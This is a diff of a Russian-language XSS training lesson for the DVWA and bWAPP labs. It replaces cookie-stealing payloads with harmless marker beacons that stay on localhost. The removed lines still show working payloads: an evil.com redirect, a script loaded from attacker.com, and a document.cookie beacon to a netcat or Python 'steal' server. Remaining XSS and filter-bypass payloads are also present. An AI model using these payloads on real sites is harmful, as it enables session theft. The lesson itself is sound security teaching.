@@ -191,17 +191,17 @@ Kali ARM64 VM используется как углубление, когда �
 ```
 Результат: всплывающее окно с текстом "XSS".
 
-**Шаг 2: Кража cookie**
+**Шаг 2: Проверка доступа к cookie без сохранения**
 ```
-<input>: <script>alert(document.cookie)</script>
+<input>: <script>alert('cookie-readable-check')</script>
 ```
-Результат: показывает cookie текущей сессии (PHPSESSID).
+Результат: показывает только учебный marker. Cookie текущей сессии не выводим и не сохраняем; доступность cookie проверяется отдельно через DevTools и фиксируется как `HttpOnly present/absent`.
 
-**Шаг 3: Перенаправление**
+**Шаг 3: Безопасная имитация redirect**
 ```
-<input>: <script>window.location='http://evil.com'</script>
+<input>: <script>console.log('redirect would be possible in lab')</script>
 ```
-Результат: браузер перенаправляется на evil.com.
+Результат: в консоли появляется marker. Реальный redirect на внешний домен не нужен для сдачи.
 
 **Шаг 4: Использование img тега (обход фильтра)**
 ```
@@ -209,11 +209,11 @@ Kali ARM64 VM используется как углубление, когда �
 ```
 Результат: срабатывает обработчик onerror.
 
-**Шаг 5: JavaScript из внешнего источника**
+**Шаг 5: JavaScript из внешнего источника как риск-модель**
 ```
-<input>: <script src="http://attacker.com/evil.js"></script>
+<input>: <script src="http://127.0.0.1:4444/demo.js"></script>
 ```
-(требует настроенного сервера атакующего)
+Этот прием оставьте как lab-only риск-модель. На Slider AI и внешних целях такие payloads не выполняются.
 
 ### Практика: Stored XSS
 
@@ -226,24 +226,24 @@ Message: <script>alert('Stored XSS!')</script>
 ```
 Результат: после отправки, при каждой загрузке страницы будет всплывать alert.
 
-**Шаг 2: Кража cookie (отправка на сервер атакующего)**
+**Шаг 2: Harmless marker beacon**
 ```
 Message: <script>
   var img = new Image();
-  img.src = 'http://127.0.0.1:4444/steal?c=' + document.cookie;
+  img.src = 'http://127.0.0.1:4444/marker?lesson=20&status=demo';
 </script>
 ```
 
-Для приема украденных cookie запустите слушатель (замените IP на ваш в локальной сети):
+Для приема marker-запроса запустите локальный слушатель:
 ```bash
-nc -lvnp 4444
+python3 xss_marker_server.py
 ```
 
-Пример вывода при краже cookie:
+Пример вывода marker beacon:
 ```
-listening on [any] 4444 ...
+listening on 127.0.0.1:4444 ...
 connect to [127.0.0.1] from (UNKNOWN) [172.17.0.2] 54321
-GET /steal?c=PHPSESSID=abc123def456;%20security=low HTTP/1.1
+GET /marker?lesson=20&status=demo HTTP/1.1
 Host: 127.0.0.1:4444
 User-Agent: Mozilla/5.0...
 ```
@@ -270,9 +270,9 @@ Message: <iframe src="javascript:alert('XSS')" style="display:none"></iframe>
 </div>
 ```
 
-**Stored XSS — кража cookie (запрос на сервер атакующего):**
+**Stored XSS — harmless marker beacon:**
 ```
-GET /steal?c=PHPSESSID%3Dabc123def456%3B%20security%3Dlow HTTP/1.1
+GET /marker?lesson=20&status=demo HTTP/1.1
 Host: 127.0.0.1:4444
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
 Referer: http://127.0.0.1:8081/vulnerabilities/xss_s/
@@ -290,7 +290,7 @@ Referer: http://127.0.0.1:8081/vulnerabilities/xss_s/
 1. **Пытаться выполнить XSS в адресной строке без параметра** — нужен параметр, который попадает в DOM
 2. **Забыть про фильтры** — на уровне Medium `<script>` часто фильтруется, используйте `<img onerror>`
 3. **Stored XSS не срабатывает** — возможно, нужно обновить страницу или проверить, сохранилось ли сообщение
-4. **HttpOnly cookie** — если cookie имеет флаг HttpOnly, `document.cookie` её не вернет
+4. **HttpOnly cookie** — если cookie имеет флаг HttpOnly, JavaScript не должен иметь к ней доступ. В evidence фиксируйте только наличие флага, не значение cookie.
 
 ### Вопросы на понимание
 
@@ -302,24 +302,24 @@ Referer: http://127.0.0.1:8081/vulnerabilities/xss_s/
 ### Адаптация под macOS (M2)
 
 ```bash
-# Создание простого сервера для приема украденных cookie (Python3 на macOS)
-cat > steal_server.py << 'EOF'
+# Создание простого сервера для приема harmless marker (Python3 на macOS)
+cat > xss_marker_server.py << 'EOF'
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        print(f"[+] Stolen: {self.path}")
+        print(f"[+] Marker: {self.path}")
         self.send_response(200)
         self.end_headers()
         
     def log_message(self, format, *args):
         pass  # Отключаем стандартные логи
 
-print("[*] Listening on 0.0.0.0:4444")
-HTTPServer(('0.0.0.0', 4444), Handler).serve_forever()
+print("[*] Listening on 127.0.0.1:4444")
+HTTPServer(('127.0.0.1', 4444), Handler).serve_forever()
 EOF
 
-python3 steal_server.py
+python3 xss_marker_server.py
 ```
 
 ---
@@ -344,16 +344,16 @@ python3 steal_server.py
    
    Опишите, какие сработали и какой код отображается в исходном HTML страницы.
 
-2. **Stored XSS — кража cookie**: Настройте простой Python-сервер для приема украденных cookie:
+2. **Stored XSS — marker beacon**: Настройте простой Python-сервер для приема harmless marker:
    ```python
    from http.server import BaseHTTPRequestHandler, HTTPServer
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
-           print("Stolen:", self.path)
+           print("Marker:", self.path)
            self.send_response(200)
-   HTTPServer(('0.0.0.0', 4444), Handler).serve_forever()
+   HTTPServer(('127.0.0.1', 4444), Handler).serve_forever()
    ```
-   Внедрите Stored XSS, который отправит cookie на этот сервер. Покажите в отчете, какие cookie были перехвачены.
+   Внедрите Stored XSS, который отправит только `lesson=20&status=demo` на этот сервер. В отчете покажите marker-запрос без cookies/tokens.
 
 3. **Обход фильтров на уровне Medium**: Переключите DVWA на уровень **Medium** в XSS (Reflected). Попробуйте пейлоады:
    - `<script>alert(1)</script>`
@@ -364,7 +364,7 @@ python3 steal_server.py
 
 4. **XSS в bWAPP**: Откройте bWAPP (http://127.0.0.1:8082), выберите уязвимость **XSS - Reflected (GET)**, уровень low. Выполните XSS с пейлоадом `<script>alert('bWAPP XSS')</script>`. Сделайте скриншот результата.
 
-5. **Cookie с флагом HttpOnly**: В DVWA (уровень Low) проверьте, есть ли у cookie флаг HttpOnly. Откройте DevTools → Application → Cookies. Если cookie доступна через `document.cookie`, значит HttpOnly отключен. Опишите, как это влияет на XSS-атаку.
+5. **Cookie с флагом HttpOnly**: В DVWA (уровень Low) проверьте, есть ли у cookie флаг HttpOnly. Откройте DevTools → Application → Cookies. В evidence запишите только `cookie_name=<redacted>`, `HttpOnly=yes/no`, `SameSite=value`; значения cookie не сохраняйте.
 
 ## Практика на Slider AI
 
